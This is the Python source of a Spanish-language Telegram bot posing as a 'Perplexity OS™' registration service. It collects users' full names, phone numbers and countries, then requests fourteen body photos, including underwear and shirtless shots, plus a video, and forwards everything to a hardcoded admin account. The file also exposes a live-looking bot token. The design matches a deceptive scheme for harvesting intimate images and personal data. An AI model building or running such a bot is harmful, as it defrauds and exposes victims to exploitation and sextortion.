# -*- coding: utf-8 -*-
import telebot
from telebot import types
import logging

TOKEN    = '8115912728:AAHiHenr2mrd9Btr8OugrrcZqyvfeNO1miI'
ADMIN_ID = 7047596357

logging.basicConfig(level=logging.INFO)
bot = telebot.TeleBot(TOKEN)
user_data = {}
admin_reply_to = {}

countries_list = ['Venezuela', 'Colombia', 'Estados Unidos', 'Mexico']

photo_requests = [
    "📸 Foto frontal de cuerpo completo (en estado relajado)",
    "📸 Foto frontal de cuerpo completo (en tension muscular)",
    "📸 Foto lateral izquierdo de cuerpo completo (relajado)",
    "📸 Foto lateral derecho de cuerpo completo (relajado)",
    "📸 Foto lateral izquierdo de cuerpo completo (en tension)",
    "📸 Foto lateral derecho de cuerpo completo (en tension)",
    "📸 Foto frontal en ropa interior o boxer (natural)",
    "📸 Foto lateral izquierdo en boxer (relajado)",
    "📸 Foto lateral derecho en boxer (relajado)",
    "📸 Foto lateral izquierdo en boxer (en tension)",
    "📸 Foto lateral derecho en boxer (en tension)",
    "📸 Foto sin camiseta (vista frontal)",
    "📸 Foto sin camiseta mostrando abdomen (relajado)",
    "📸 Foto sin camiseta mostrando abdomen (en tension)"
]

MIN_PHOTO_SIZE = 5 * 1024
MAX_PHOTO_SIZE = 500 * 1024 * 1024
MAX_VIDEO_SIZE = 500 * 1024 * 1024

@bot.message_handler(commands=['start'])
def start(message):
    user_data[message.chat.id] = {'step': 1}
    bot.send_message(message.chat.id, "Hola, ¿Cual es tu nombre completo?")
    bot.send_message(ADMIN_ID, f"Nuevo usuario inicio el registro. Chat ID: {message.chat.id}")

@bot.message_handler(commands=['saltar'])
def saltar(message):
    uid = message.chat.id
    data = user_data.get(uid, {})
    step = data.get('step', 0)
    if step >= 1:
        data['step'] = 8
        user_data[uid] = data
        bot.send_message(uid, "Has saltado la etapa de fotos y videos.")
        bot.send_message(uid,
            "Con los datos proporcionados nos pondremos en contacto contigo "
            "en un lapso de 48 horas. Gracias. 🥰\n-Perplexity OS™"
        )
        bot.send_message(uid, "¿Tienes alguna duda o pregunta? Si es asi, escribela ahora.")
    else:
        bot.send_message(uid, "No puedes usar /saltar en este momento.")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    uid = message.chat.id
    data = user_data.get(uid, {})
    step = data.get('step', 1)

    # Soporte para "#saltar"
    if message.text.strip().lower() == "#saltar":
        if step >= 1:
            data['step'] = 8
            user_data[uid] = data
            bot.send_message(uid, "Has saltado la etapa de fotos y videos.")
            bot.send_message(uid,
                "Con los datos proporcionados nos pondremos en contacto contigo "
                "en un lapso de 48 horas. Gracias. 🥰\n-Perplexity OS™"
            )
            bot.send_message(uid, "¿Tienes alguna duda o pregunta? Si es asi, escribela ahora.")
        else:
            bot.send_message(uid, "No puedes usar #saltar en este momento.")
        return

    if uid == ADMIN_ID and ADMIN_ID in admin_reply_to:
        target_id = admin_reply_to.pop(ADMIN_ID)
        bot.send_message(target_id, f"👤 Perplexity OS™:\n{message.text}")
        bot.send_message(ADMIN_ID, f"✅ Respuesta enviada al usuario {target_id}")
        return

    if step == 1:
        data['nombre'] = message.text.strip()
        data['step'] = 2
        user_data[uid] = data
        bot.send_message(uid, "Perfecto. Ahora, por favor envia tu numero de telefono.")
    elif step == 2:
        data['telefono'] = message.text.strip()
        data['step'] = 3
        user_data[uid] = data
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        for c in countries_list:
            markup.add(c)
        bot.send_message(uid, "¿Desde que pais escribes?", reply_markup=markup)
    elif step == 3:
        if message.text in countries_list:
            data['pais'] = message.text
            data['step'] = 4
            data['photo_index'] = 0
            user_data[uid] = data
            bot.send_message(uid, photo_requests[0])
        else:
            bot.send_message(uid, "Por favor selecciona un pais valido de la lista.")
    elif step == 8:
        duda = message.text.strip()
        markup = types.InlineKeyboardMarkup()
        button = types.InlineKeyboardButton(
            f"✉️ Responder a {data.get('nombre','Usuario')}",
            callback_data=f"responder_{uid}"
        )
        markup.add(button)
        bot.send_message(ADMIN_ID,
            f"📨 Nueva duda de {data.get('nombre','Desconocido')} (ID {uid}):\n\n{duda}",
            reply_markup=markup
        )
        bot.send_message(uid, "Gracias, tu pregunta ha sido enviada. Te respondere en breve.")
    else:
        bot.send_message(uid, "Por favor, sigue las instrucciones del bot.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("responder_"))
def handle_responder_callback(call):
    if call.message.chat.id != ADMIN_ID:
        return
    uid = int(call.data.split("_")[1])
    admin_reply_to[ADMIN_ID] = uid
    nombre = user_data.get(uid, {}).get('nombre', 'usuario')
    bot.send_message(ADMIN_ID, f"¿Que quieres responderle a {nombre} (ID {uid})?")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    uid = message.chat.id
    data = user_data.get(uid, {})
    step = data.get('step', 0)

    if step != 4:
        bot.send_message(uid, "Por favor, sigue las instrucciones.")
        return

    index = data.get('photo_index', 0)
    file_info = bot.get_file(message.photo[-1].file_id)
    file_size = file_info.file_size

    if file_size < MIN_PHOTO_SIZE:
        bot.send_message(uid, "⚠️ La foto es demasiado pequena (minimo 5 KB), intenta con una mas clara.")
        return
    if file_size > MAX_PHOTO_SIZE:
        bot.send_message(uid, "⚠️ La foto es demasiado grande (maximo 500 MB), intenta con una mas ligera.")
        return

    bot.send_photo(ADMIN_ID, message.photo[-1].file_id,
        caption=f"📷 Foto {index+1}/{len(photo_requests)} del usuario {data.get('nombre','Desconocido')} (ID {uid})"
    )
    bot.send_message(uid, "✅ Foto recibida.")

    if index < len(photo_requests) - 1:
        data['photo_index'] += 1
        bot.send_message(uid, photo_requests[data['photo_index']])
    else:
        data['step'] = 5
        del data['photo_index']
        bot.send_message(uid, "🎥 Ahora por favor envia un video segun las instrucciones.")
    user_data[uid] = data

@bot.message_handler(content_types=['video'])
def handle_video(message):
    uid = message.chat.id
    data = user_data.get(uid, {})
    step = data.get('step', 0)

    if step == 5:
        file_size = message.video.file_size
        if file_size > MAX_VIDEO_SIZE:
            bot.send_message(uid, "El video es demasiado grande, intenta enviar uno mas pequeno.")
            return

        bot.send_video(ADMIN_ID, message.video.file_id,
            caption=f"🎥 Video del usuario {data.get('nombre','Desconocido')} (ID {uid})"
        )
        bot.send_message(uid, "✅ Gracias por completar el registro.")
        bot.send_message(uid,
            "Con los datos proporcionados nos pondremos en contacto contigo "
            "en un lapso de 48 horas. Gracias. 🥰\n-Perplexity OS™"
        )
        bot.send_message(uid, "¿Tienes alguna duda o pregunta? Si es asi, escribela ahora.")
        data['step'] = 8
        user_data[uid] = data
    else:
        bot.send_message(uid, "Por favor, sigue las instrucciones.")

@bot.message_handler(func=lambda m: True)
def fallback(m):
    uid = m.chat.id
    step = user_data.get(uid, {}).get('step', 0)
    if step == 4:
        index = user_data[uid].get('photo_index', 0)
        bot.send_message(uid, f"📸 {photo_requests[index]} (minimo 5 KB, maximo 500 MB)")
    elif step == 5:
        bot.send_message(uid, "Por favor, envia un video.")
    elif step == 8:
        bot.send_message(uid, "Si tienes alguna duda, escribela aqui.")
    else:
        bot.send_message(uid, "Sigue las instrucciones del bot, por favor.")

if __name__ == "__main__":
    print("El bot esta en linea 🤖")
    bot.send_message(ADMIN_ID, "🤖 Bot Perplexity esta en linea y listo para usar.")
    bot.infinity_polling()
